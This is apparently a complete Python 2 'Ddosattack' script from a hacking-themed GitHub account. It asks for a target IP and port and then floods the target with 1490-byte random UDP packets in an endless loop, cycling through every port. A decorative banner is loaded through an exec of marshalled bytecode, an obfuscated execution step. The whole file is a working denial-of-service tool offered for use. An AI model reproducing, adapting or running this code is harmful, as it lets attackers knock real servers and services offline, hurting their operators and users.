#!/usr/bin/python
# -*- coding: utf-8 -*-
# Ddosattack
# Coded by Senja
# Github: github.com/thedarksec/Ddosattack

import os, sys, time, random, socket, string, marshal
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def loads():
    tix = [
     '.   ', '..  ', '... ']
    for o in tix:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mStarting ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(f):
    for e in f + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)

exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s\n\x00\x00\x00d\x00\x00Z\x00\x00d\x01\x00S(\x02\x00\x00\x00sP\x01\x00\x00\n\n        \x1b[0;31m\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80   \x1b[0;33m\xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88 \xe2\x96\x88\n        \x1b[0;31m\xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x88   \x1b[0;33m\xe2\x96\x88\xe2\x96\x80\xe2\x96\x88  \xe2\x96\x88   \xe2\x96\x88  \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88   \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\n        \x1b[0;31m\xe2\x96\x80\xe2\x96\x80  \xe2\x96\x80\xe2\x96\x80  \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80   \x1b[0;33m\xe2\x96\x80 \xe2\x96\x80  \xe2\x96\x80   \xe2\x96\x80  \xe2\x96\x80 \xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80 \xe2\x96\x80\nN(\x01\x00\x00\x00t\x04\x00\x00\x00logo(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00t\x00\x00\x00\x00t\x08\x00\x00\x00<module>\x06\x00\x00\x00R\x01\x00\x00\x00'))
print (logo)

print("\033[0m[\033[94;1m#\033[0m] Denial of Service ")
print("\033[0m[\033[93;1m*\033[0m] Coded by Senja ")
print("\033[0m[\033[96;1m&\033[0m] My Github: @thedarksec ")
time.sleep(1)
print

ip = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mIP Target: \033[0m")
port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mPort: \033[0m")
print
write("\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mChecking ...")
time.sleep(1)
print
print("[ IIIIIIIIIIII Loads       15%                          ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIII Loads       25%                    ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIII Loads       50%              ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75%        ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ]")
print
loads()
print
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[0mSend \033[1;2;96m%s \033[0mPacket to %s Target \033[1;2;91m%s"%(sent, ip, port)
     if port == 65534:
       port = 1
